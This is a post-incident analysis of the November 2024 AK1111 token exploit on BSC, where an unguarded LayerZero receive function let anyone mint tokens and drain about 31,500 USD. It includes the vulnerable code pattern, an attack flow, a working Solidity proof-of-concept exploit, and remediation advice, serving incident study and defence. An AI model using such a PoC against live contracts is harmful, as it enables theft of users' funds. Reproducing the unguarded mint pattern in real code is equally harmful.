# AK1111 — LayerZero Cross-Chain Receive Function Access Control Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-21 |
| **Protocol** | AK1111 Token |
| **Chain** | BSC |
| **Loss** | ~31,500 USD |
| **Attacker** | [0xCe21C6e4](https://bscscan.com/address/0xCe21C6e4fa557A9041FA98DFf59A4401Ef0a18aC) |
| **Attack Tx** | [0xc29c98da](https://bscscan.com/tx/0xc29c98da0c14f4ca436d38f8238f8da1c84c4b1ee6480c4b4facc4b81a013438) |
| **Vulnerable Contract** | [0xc3B1b45e](https://bscscan.com/address/0xc3B1b45e5784A8efececfC0BE2E28247d3f49963) |
| **Root Cause** | No access control on nonblockingLzReceive1() — anyone can call it to mint AK1111 tokens without limit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/Ak1111_exp.sol) |

---
## 1. Vulnerability Overview

The AK1111 token exposed its `nonblockingLzReceive1()` function — which handles LayerZero cross-chain messages — as freely callable from outside. This function should only be callable by the LayerZero endpoint, but the absence of an `onlyEndpoint` or equivalent restriction allowed the attacker to call it directly and freely mint AK1111 tokens equal to the entire balance held in the LP pool.

## 2. Vulnerable Code Analysis

```solidity
// ❌ AK1111 Token: no access control on LayerZero receive function
contract AK1111Token {
    // ❌ No onlyEndpoint or onlyLzApp
    // ❌ Anyone can specify arbitrary _srcChainId, _srcAddress, _nonce, _payload
    function nonblockingLzReceive1(
        uint16 _srcChainId,
        address _srcAddress,
        uint256 _nonce,
        bytes memory _payload
    ) external {
        // Decodes _payload and mints tokens
        // ❌ No check that caller is the actual LayerZero endpoint
        _mint(/* decoded recipient */, /* decoded amount */);
    }
}

// ✅ Fix:
// modifier onlyEndpoint() {
//     require(msg.sender == lzEndpoint, "not endpoint");
//     _;
// }
// function nonblockingLzReceive1(...) external onlyEndpoint { ... }
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: Ak1111_decompiled.sol
contract Ak1111 {
    function nonblockingLzReceive1(uint16 p0, address p1, uint256 p2, bytes memory p3) external {}  // ❌ Vulnerability
```

## 3. Attack Flow

```
Attacker (0xCe21C6e4)
  │
  ├─[1]─▶ Query AK1111 balance of CAKE_LP
  │         ak1111Balance = ak1111.balanceOf(CAKE_LP)
  │
  ├─[2]─▶ nonblockingLzReceive1(0, address(this), ak1111Balance, "")
  │         └─ ❌ No access control → freely mint AK1111 equal to LP balance
  │
  ├─[3]─▶ Swap AK1111 → USDT (PancakeSwap)
  │         ak1111.approve(PANCAKE_ROUTER, max)
  │         swapExactTokensForTokens(AK1111 → USDT)
  │
  └─[4]─▶ ~31,500 USD drained
```

## 4. PoC Code

```solidity
function testExploit() public balanceLog {
    IAk1111 ak1111 = IAk1111(AK1111_ADDR);
    uint256 ak1111Balance = ak1111.balanceOf(CAKE_LP);

    // ❌ Direct call to LayerZero receive function → free mint
    ak1111.nonblockingLzReceive1(0, address(this), ak1111Balance, "");

    // Sell obtained AK1111 → USDT
    ak1111.approve(PANCAKE_ROUTER, type(uint256).max);
    address[] memory path = new address[](2);
    path[0] = AK1111_ADDR;
    path[1] = BSC_USD;
    IPancakeRouter(payable(PANCAKE_ROUTER))
        .swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ak1111Balance, 0, path, address(this), block.timestamp
        );
}

interface IAk1111 is IERC20 {
    function nonblockingLzReceive1(
        uint16 _srcChainId,
        address _srcAddress,
        uint256 _nonce,
        bytes memory _payload
    ) external;
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing access control on cross-chain message handler |
| **Attack Vector** | Direct call to LayerZero receive function |
| **CWE** | CWE-284: Improper Access Control |
| **DASP** | Access Control Vulnerability |
| **Severity** | Critical |

## 6. Remediation Recommendations

1. **Apply onlyEndpoint**: LayerZero receive functions must be restricted to calls from the official endpoint only
2. **Use official LayerZero pattern**: Inherit the `lzApp` base contract and use the `_checkGasLimit` / `_lzReceive` pattern
3. **Mint cap**: Enforce maximum amount and rate limits on cross-chain minting
4. **Cross-chain audit**: LayerZero/Axelar and other cross-chain functions require a dedicated security audit

## 7. Lessons Learned

- A LayerZero cross-chain receive function that is not restricted to the official endpoint becomes an unrestricted minting path.
- Tokens that use cross-chain bridge patterns have a significantly larger attack surface than standard ERC20 tokens.
- `nonblocking` receive functions are particularly prone to missing access controls and require extra vigilance.